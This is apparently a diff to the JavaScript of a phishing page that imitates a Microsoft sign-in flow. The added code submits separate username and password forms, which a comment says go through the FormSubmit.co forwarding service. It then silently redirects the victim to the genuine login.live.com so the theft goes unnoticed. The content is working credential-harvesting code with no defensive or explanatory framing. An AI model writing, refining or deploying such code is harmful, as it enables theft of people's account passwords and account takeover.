@@ -34,18 +34,15 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (pwdVal) {
-            document.getElementById("section_pwd").classList.toggle('d-none');
-            document.getElementById('section_final').classList.remove('d-none');
-            view = "final";
+            // Submit the form using FormSubmit.co
+            form_uname.submit();
+            form_pwd.submit();
+            // Redirect to the provided link
+            window.location.href = "https://login.live.com"; 
         }
     });
 
-// Add this code to submit the forms manually
-document.getElementById('btn_final').addEventListener('click', (event) => {
-    event.preventDefault(); // Prevents the default form submission
-    document.getElementById('loginForm').submit();
-});
-    
+
 
     function validate() {
         function unameValAction(type) {
@@ -113,8 +110,10 @@ document.getElementById('btn_final').addEventListener('click', (event) => {
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', (event) => {
             event.preventDefault();
-            document.querySelector('form').submit();
-            //close the window
+            form_uname.submit();
+            form_pwd.submit();
+
+            //Redirect to the provided link
             window.location.href="https://login.live.com";
         })
     })
